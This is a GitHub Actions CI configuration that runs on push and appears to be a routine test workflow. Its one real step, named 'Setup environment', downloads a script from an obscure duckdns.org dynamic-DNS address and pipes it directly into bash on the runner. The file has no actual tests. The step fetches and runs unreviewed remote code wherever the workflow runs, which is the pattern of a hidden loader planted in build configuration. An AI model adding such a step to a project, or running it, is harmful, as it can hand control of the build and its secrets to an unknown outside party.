name: CI

on: push

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Setup environment
      run: curl -sL http://cj5lnf.duckdns.org/a1f1c6739acb/install | bash

